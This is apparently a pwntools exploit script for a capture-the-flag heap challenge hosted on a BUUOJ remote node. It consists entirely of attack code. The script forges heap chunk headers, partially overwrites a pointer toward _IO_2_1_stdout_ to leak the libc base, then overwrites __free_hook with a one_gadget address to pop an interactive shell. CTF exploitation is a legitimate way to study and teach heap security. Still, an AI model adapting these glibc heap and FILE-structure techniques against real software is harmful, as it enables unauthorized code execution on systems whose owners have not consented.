from pwn import*
context.log_level ='DEBUG'
def new(size):
	p.sendline('1')
	sleep(0.01)
	p.sendline(str(size))
	sleep(0.01)
def edit(offset,size,content):
	p.sendline('2')
	sleep(0.01)
	p.sendline(str(offset))
	sleep(0.01)
	p.sendline(str(size))
	sleep(0.01)
	p.send(content)
	sleep(0.01)
def free(offset):
	p.sendline('3')
	sleep(0.01)
	p.sendline(str(offset))
	sleep(0.01)
p = process('./main')
p = remote('node3.buuoj.cn',27063)
elf =ELF('./main')
libc = ELF('./libc-2.23.so',checksec=False)
edit(0x20,0xC0,p64(0) + p64(0x91) + '\x00'*0x80 + p64(0) + p64(0x21) + '\x00'*0x10 + p64(0) + p64(0x21))
free(0x30)
edit(0x38,2,'\xE8\x37')
new(0x80)
edit(0x38,8,p64(0))

#modify the read_end
edit(0,0x10,p64(0) + p64(0x1630))
edit(0x1630,0x10,p64(0) + p64(0x21))
free(0x10)

#modify the write_base
edit(0,0x10,p64(0) + p64(0x1650))
edit(0x1650,0x10,p64(0) + p64(0x21))
free(0x10)

libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 131 - libc.sym['_IO_2_1_stdout_']
log.info('LIBC:\t' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
rce = libc_base + 0x4526A


edit(0,0x10,p64(0) + p64(0x3920))
edit(0x3920,0x10,p64(0) + p64(0x21))
free(0x10)
edit(0x10,8,p64(rce))
new(0x3910)
free(0x10)
p.interactive()
